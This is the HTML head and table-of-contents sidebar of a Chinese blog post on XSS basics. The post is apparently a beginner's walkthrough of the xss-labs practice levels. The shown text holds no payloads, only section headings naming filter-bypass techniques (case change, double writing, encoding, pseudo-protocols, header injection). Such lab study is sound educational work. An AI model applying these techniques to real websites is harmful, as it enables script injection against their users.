<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width">
<meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
<meta name="theme-color" content="#222" media="(prefers-color-scheme: dark)"><meta name="generator" content="Hexo 8.1.1">

  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/zhuzhuxia-32x32.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/zhuzhuxia-16x16.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/7.0.0/css/all.min.css" integrity="sha256-VHqXKFhhMxcpubYf9xiWdCiojEbY9NexQ4jh8AxbvcM=" crossorigin="anonymous">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">

<script class="next-config" data-name="main" type="application/json">{"hostname":"zq-rookie-hacker.github.io","root":"/","images":"/images","scheme":"Muse","darkmode":true,"version":"8.26.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":"18px","offset":0},"hljswrap":true,"codeblock":{"theme":{"light":"default","dark":"stackoverflow-dark"},"prism":{"light":"prism","dark":"prism-dark"},"copy_button":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"language":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":"utterances","storage":true,"lazyload":false,"nav":null,"activeClass":"utterances"},"stickytabs":false,"motion":{"enable":true,"async":false,"duration":200,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"placeholder":"搜索文章...","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js" defer></script>

    <meta name="description" content="前言本人是个网安菜鸡，这是写的第一篇有关XSS漏洞学习的博客，请多多指教。 1.由于不可以在非代码区书写完整的html标签 用   [ ]  代替 &lt;  &gt; 1&lt;sript&gt;   --&gt;   [script]   2.作者用的是chrome浏览器，不同的浏览器回显的网页代码颜色或是容错规则方面有差异  一、xss漏洞是什么？XSS（跨站脚本攻击，Cross-Site">
<meta property="og:type" content="article">
<meta property="og:title" content="XSS漏洞基础">
<meta property="og:url" content="https://zq-rookie-hacker.github.io/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/">
<meta property="og:site_name" content="ZQ-Rookie-Hacker&#39;s Blog">
<meta property="og:description" content="前言本人是个网安菜鸡，这是写的第一篇有关XSS漏洞学习的博客，请多多指教。 1.由于不可以在非代码区书写完整的html标签 用   [ ]  代替 &lt;  &gt; 1&lt;sript&gt;   --&gt;   [script]   2.作者用的是chrome浏览器，不同的浏览器回显的网页代码颜色或是容错规则方面有差异  一、xss漏洞是什么？XSS（跨站脚本攻击，Cross-Site">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://zq-rookie-hacker.github.io/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_1.png">
<meta property="og:image" content="https://zq-rookie-hacker.github.io/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_2.png">
<meta property="og:image" content="https://zq-rookie-hacker.github.io/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_3.png">
<meta property="og:image" content="https://zq-rookie-hacker.github.io/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_4.png">
<meta property="og:image" content="https://zq-rookie-hacker.github.io/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_5.png">
<meta property="og:image" content="https://zq-rookie-hacker.github.io/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_6.png">
<meta property="og:image" content="https://zq-rookie-hacker.github.io/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_7.png">
<meta property="og:image" content="https://zq-rookie-hacker.github.io/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_8.png">
<meta property="og:image" content="https://zq-rookie-hacker.github.io/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_9.png">
<meta property="og:image" content="https://zq-rookie-hacker.github.io/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_10.png">
<meta property="og:image" content="https://zq-rookie-hacker.github.io/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_11.png">
<meta property="og:image" content="https://zq-rookie-hacker.github.io/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_12.png">
<meta property="og:image" content="https://zq-rookie-hacker.github.io/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_13.png">
<meta property="og:image" content="https://zq-rookie-hacker.github.io/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_14.png">
<meta property="og:image" content="https://zq-rookie-hacker.github.io/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_15.png">
<meta property="og:image" content="https://zq-rookie-hacker.github.io/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_16.png">
<meta property="og:image" content="https://zq-rookie-hacker.github.io/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_17.png">
<meta property="og:image" content="https://zq-rookie-hacker.github.io/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_18.png">
<meta property="og:image" content="https://zq-rookie-hacker.github.io/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_19.png">
<meta property="og:image" content="https://zq-rookie-hacker.github.io/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_20.png">
<meta property="og:image" content="https://zq-rookie-hacker.github.io/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_21.png">
<meta property="og:image" content="https://zq-rookie-hacker.github.io/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_22.png">
<meta property="og:image" content="https://zq-rookie-hacker.github.io/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_23.png">
<meta property="og:image" content="https://zq-rookie-hacker.github.io/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_24.png">
<meta property="og:image" content="https://zq-rookie-hacker.github.io/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_25.png">
<meta property="og:image" content="https://zq-rookie-hacker.github.io/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_26.png">
<meta property="og:image" content="https://zq-rookie-hacker.github.io/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_27.png">
<meta property="og:image" content="https://zq-rookie-hacker.github.io/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_28.png">
<meta property="og:image" content="https://zq-rookie-hacker.github.io/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_29.png">
<meta property="og:image" content="https://zq-rookie-hacker.github.io/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_30.png">
<meta property="og:image" content="https://zq-rookie-hacker.github.io/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_31.png">
<meta property="og:image" content="https://zq-rookie-hacker.github.io/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_32.png">
<meta property="og:image" content="https://zq-rookie-hacker.github.io/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_33.png">
<meta property="og:image" content="https://zq-rookie-hacker.github.io/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_34.png">
<meta property="og:image" content="https://zq-rookie-hacker.github.io/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_35.png">
<meta property="og:image" content="https://zq-rookie-hacker.github.io/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_36.png">
<meta property="og:image" content="https://zq-rookie-hacker.github.io/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_37.png">
<meta property="og:image" content="https://zq-rookie-hacker.github.io/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_38.png">
<meta property="og:image" content="https://zq-rookie-hacker.github.io/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_39.png">
<meta property="og:image" content="https://zq-rookie-hacker.github.io/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_40.png">
<meta property="og:image" content="https://zq-rookie-hacker.github.io/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_41.png">
<meta property="og:image" content="https://zq-rookie-hacker.github.io/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_42.png">
<meta property="og:image" content="https://zq-rookie-hacker.github.io/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_43.png">
<meta property="og:image" content="https://zq-rookie-hacker.github.io/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_44.png">
<meta property="og:image" content="https://zq-rookie-hacker.github.io/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_45.png">
<meta property="og:image" content="https://zq-rookie-hacker.github.io/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_46.png">
<meta property="og:image" content="https://zq-rookie-hacker.github.io/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_47.png">
<meta property="og:image" content="https://zq-rookie-hacker.github.io/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_48.png">
<meta property="og:image" content="https://zq-rookie-hacker.github.io/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_49.png">
<meta property="og:image" content="https://zq-rookie-hacker.github.io/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_50.png">
<meta property="og:image" content="https://zq-rookie-hacker.github.io/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_51.png">
<meta property="og:image" content="https://zq-rookie-hacker.github.io/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_52.png">
<meta property="og:image" content="https://zq-rookie-hacker.github.io/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_53.png">
<meta property="og:image" content="https://zq-rookie-hacker.github.io/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_54.png">
<meta property="og:image" content="https://zq-rookie-hacker.github.io/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_55.png">
<meta property="og:image" content="https://zq-rookie-hacker.github.io/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_56.png">
<meta property="og:image" content="https://zq-rookie-hacker.github.io/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_57.png">
<meta property="og:image" content="https://zq-rookie-hacker.github.io/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_58.png">
<meta property="og:image" content="https://zq-rookie-hacker.github.io/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_59.png">
<meta property="og:image" content="https://zq-rookie-hacker.github.io/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_60.png">
<meta property="og:image" content="https://zq-rookie-hacker.github.io/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_61.png">
<meta property="article:published_time" content="2025-01-18T04:00:00.000Z">
<meta property="article:modified_time" content="2025-05-18T04:00:00.000Z">
<meta property="article:author" content="ZQ-Rookie-Hacker">
<meta property="article:tag" content="XSS">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://zq-rookie-hacker.github.io/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/image_1.png">


<link rel="canonical" href="https://zq-rookie-hacker.github.io/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/">


<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"https://zq-rookie-hacker.github.io/2025/01/18/XSS%E6%BC%8F%E6%B4%9E%E5%9F%BA%E7%A1%80/","path":"2025/01/18/XSS漏洞基础/","title":"XSS漏洞基础"}</script>

<script class="next-config" data-name="calendar" type="application/json">""</script>
<title>XSS漏洞基础 | ZQ-Rookie-Hacker's Blog</title>
  








  
  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous" defer></script>
<script src="/js/utils.js" defer></script><script src="/js/motion.js" defer></script><script src="/js/sidebar.js" defer></script><script src="/js/next-boot.js" defer></script>

  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.5.0/search.js" integrity="sha256-xFC6PJ82SL9b3WkGjFavNiA9gm5z6UBxWPiu4CYjptg=" crossorigin="anonymous" defer></script>
<script src="/js/third-party/search/local-search.js" defer></script>


  <script class="next-config" data-name="mermaid" type="application/json">{"enable":true,"theme":{"light":"default","dark":"dark"},"js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/mermaid/11.10.1/mermaid.min.js","integrity":"sha256-BmQmdWDS8X2OTbrwELWK366LV6escyWhHHe0XCTU/Hk="}}</script>
  <script src="/js/third-party/tags/mermaid.js" defer></script>





  


  <script class="next-config" data-name="leancloud_visitors" type="application/json">{"enable":true,"app_id":"22F2XnoONZRtEbXvXO1SDcjS-gzGzoHsz","app_key":"bIFSRG6LeUO90VdfRBHUXNQs","interval":900,"minimum_time":10,"cache":true,"cache_expire":900,"betterPerformance":true,"id":"path"}</script>
  <script src="/js/third-party/statistics/lean-analytics.js" defer></script>



  <noscript>
    <link rel="stylesheet" href="/css/noscript.css">
  </noscript>
</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <div class="column">
      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <p class="site-title">ZQ-Rookie-Hacker's Blog</p>
      <i class="logo-line"></i>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger" aria-label="搜索" role="button">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu"><li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a></li><li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li><li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li><li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li><li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup">
      <div class="search-header">
        <span class="search-icon">
          <i class="fa fa-search"></i>
        </span>
        <div class="search-input-container">
          <input autocomplete="off" autocapitalize="off" maxlength="80"
                placeholder="搜索..." spellcheck="false"
                type="search" class="search-input">
        </div>
        <span class="popup-btn-close" role="button">
          <i class="fa fa-times-circle"></i>
        </span>
      </div>
      <div class="search-result-container">
        <div class="search-result-icon">
          <i class="fa fa-spinner fa-pulse fa-5x"></i>
        </div>
      </div>
    </div>
  </div>

</header>
        
  
  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%B8%80%E3%80%81xss%E6%BC%8F%E6%B4%9E%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F"><span class="nav-text">一、xss漏洞是什么？</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BA%8C%E3%80%81xss%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86"><span class="nav-text">二、xss漏洞的基本知识</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-HTML-%E4%B8%AD%E7%9A%84%E3%80%8C%E6%96%87%E6%9C%AC%E6%A0%87%E7%AD%BE%E3%80%8D"><span class="nav-text">1.HTML 中的「文本标签」</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-script-%E5%B5%8C%E5%A5%97%E5%9C%A8%E4%B8%8D%E5%90%8C%E6%A0%87%E7%AD%BE%E4%B8%8B%E7%9A%84%E8%84%9A%E6%9C%AC%E8%BF%90%E8%A1%8C%E6%83%85%E5%86%B5"><span class="nav-text">2.script 嵌套在不同标签下的脚本运行情况</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%84%9A%E6%9C%AC%E6%89%A7%E8%A1%8C%E7%9A%84%E6%A0%B8%E5%BF%83%E8%A7%84%E5%88%99"><span class="nav-text">*脚本执行的核心规则</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%A1%A5%E5%85%85%E7%9F%A5%E8%AF%86"><span class="nav-text">*补充知识</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#1-%E6%A0%87%E7%AD%BE%E7%9A%84%E6%A0%87%E5%87%86%E4%BD%8D%E7%BD%AE"><span class="nav-text">1. &lt;script&gt; 标签的标准位置</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-%E5%B5%8C%E5%A5%97%E5%9C%A8%E5%85%B6%E4%BB%96%E6%A0%87%E7%AD%BE%E5%86%85"><span class="nav-text">2. &lt;script&gt; 嵌套在其他标签内</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%9C%BA%E6%99%AF-1%EF%BC%9A%E6%99%AE%E9%80%9A%E5%AE%B9%E5%99%A8%E6%A0%87%E7%AD%BE%EF%BC%88%E5%A6%82-%E3%80%81%EF%BC%89"><span class="nav-text">场景 1：普通容器标签（如 &lt;div&gt;、&lt;span&gt;）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%9C%BA%E6%99%AF-2%EF%BC%9A%E8%A1%A8%E5%8D%95%E6%A0%87%E7%AD%BE%EF%BC%88%E5%A6%82-%EF%BC%89"><span class="nav-text">场景 2：表单标签（如 &lt;form&gt;）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%9C%BA%E6%99%AF-3%EF%BC%9A%E8%A1%A8%E6%A0%BC%E6%A0%87%E7%AD%BE%EF%BC%88%E5%A6%82-%E3%80%81%EF%BC%89"><span class="nav-text">场景 3：表格标签（如 &lt;table&gt;、&lt;tr&gt;）</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3-%E5%9C%A8%E7%89%B9%E6%AE%8A%E6%A0%87%E7%AD%BE%E4%B8%AD%E7%9A%84%E8%A1%8C%E4%B8%BA"><span class="nav-text">3. &lt;script&gt; 在特殊标签中的行为</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%9C%BA%E6%99%AF-1%EF%BC%9A-%E6%A0%87%E7%AD%BE"><span class="nav-text">场景 1：&lt;noscript&gt; 标签</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%9C%BA%E6%99%AF-2%EF%BC%9A-%E6%A0%87%E7%AD%BE"><span class="nav-text">场景 2：&lt;template&gt; 标签</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%9C%BA%E6%99%AF-3%EF%BC%9ASVG-%E6%88%96-MathML-%E6%A0%87%E7%AD%BE"><span class="nav-text">场景 3：SVG 或 MathML 标签</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4-%E5%8A%A8%E6%80%81%E6%8F%92%E5%85%A5%E7%9A%84"><span class="nav-text">4. 动态插入的 &lt;script&gt;</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%8F%92%E5%85%A5%E5%88%B0-%E6%88%96-%E4%B8%AD%EF%BC%9A"><span class="nav-text">插入到 &lt;head&gt; 或 &lt;body&gt; 中：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%8F%92%E5%85%A5%E5%88%B0%E5%85%B6%E4%BB%96%E5%AE%B9%E5%99%A8%E4%B8%AD%EF%BC%88%E5%A6%82-%EF%BC%89%EF%BC%9A"><span class="nav-text">插入到其他容器中（如 &lt;div&gt;）：</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#5-XSS-%E6%94%BB%E5%87%BB%E4%B8%AD%E7%9A%84-%E5%B5%8C%E5%A5%97%E5%88%A9%E7%94%A8"><span class="nav-text">5. XSS 攻击中的 &lt;script&gt; 嵌套利用</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%9C%BA%E6%99%AF-1%EF%BC%9A%E5%B1%9E%E6%80%A7%E5%86%85%E7%9A%84%E8%84%9A%E6%9C%AC"><span class="nav-text">场景 1：属性内的脚本</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%9C%BA%E6%99%AF-2%EF%BC%9A%E9%97%AD%E5%90%88%E6%A0%87%E7%AD%BE%E6%B3%A8%E5%85%A5"><span class="nav-text">场景 2：闭合标签注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%9C%BA%E6%99%AF-3%EF%BC%9A%E5%88%A9%E7%94%A8-HTML-%E8%A7%A3%E6%9E%90%E7%89%B9%E6%80%A7"><span class="nav-text">场景 3：利用 HTML 解析特性</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%B8%89%E3%80%81xss-labs%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF-%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90"><span class="nav-text">三、xss-labs解题思路+源码分析</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#level1"><span class="nav-text">level1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level2"><span class="nav-text">level2</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AD%97%E7%AC%A6%E9%80%83%E9%80%B8"><span class="nav-text">*字符逃逸</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level3"><span class="nav-text">level3</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%BB%98%E8%AE%A4Htmlspecialchars-%E5%87%BD%E6%95%B0"><span class="nav-text">*默认Htmlspecialchars()函数</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level4"><span class="nav-text">level4</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8F%92%E5%85%A5%E5%B1%9E%E6%80%A7"><span class="nav-text">*插入属性</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level5"><span class="nav-text">level5</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="nav-text">*伪协议</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%B6%A3%E4%BA%8B"><span class="nav-text">*趣事</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level6"><span class="nav-text">level6</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A4%A7%E5%B0%8F%E5%86%99%E7%BB%95%E8%BF%87"><span class="nav-text">*大小写绕过</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level7"><span class="nav-text">level7</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%8C%E5%86%99%E7%BB%95%E8%BF%87"><span class="nav-text">*双写绕过</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level8"><span class="nav-text">level8</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BC%96%E7%A0%81%E7%BB%95%E8%BF%87"><span class="nav-text">*编码绕过</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level9"><span class="nav-text">level9</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%B3%A8%E9%87%8A%EF%BC%9A"><span class="nav-text">*注释：</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level10"><span class="nav-text">level10</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%9A%90%E8%97%8F%E6%A0%87%E7%AD%BE"><span class="nav-text">*隐藏标签</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%B6%A3%E4%BA%8B-1"><span class="nav-text">*趣事</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level11"><span class="nav-text">level11</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Referer"><span class="nav-text">*Referer</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level12"><span class="nav-text">level12</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#HTTP-USER-AGENT"><span class="nav-text">*HTTP_USER_AGENT</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level13"><span class="nav-text">level13</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Cookie"><span class="nav-text">*Cookie</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level14a"><span class="nav-text">level14a</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#PHP%E8%A7%A3%E6%9E%90%E6%89%A7%E8%A1%8C%E6%9C%BA%E5%88%B6"><span class="nav-text">*PHP解析执行机制</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level14b"><span class="nav-text">level14b</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#EXIF"><span class="nav-text">*EXIF</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level15"><span class="nav-text">level15</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#AngularJS%E4%B8%8E%E6%8C%87%E4%BB%A4ng-inlcude"><span class="nav-text">*AngularJS与指令ng-inlcude</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level16"><span class="nav-text">level16</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8D%A2%E8%A1%8C%E7%AC%A6%E7%BB%95%E8%BF%87"><span class="nav-text">*换行符绕过</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#level17"><span class="nav-text">level17</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%B6%A3%E4%BA%8B-2"><span class="nav-text">*趣事</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" 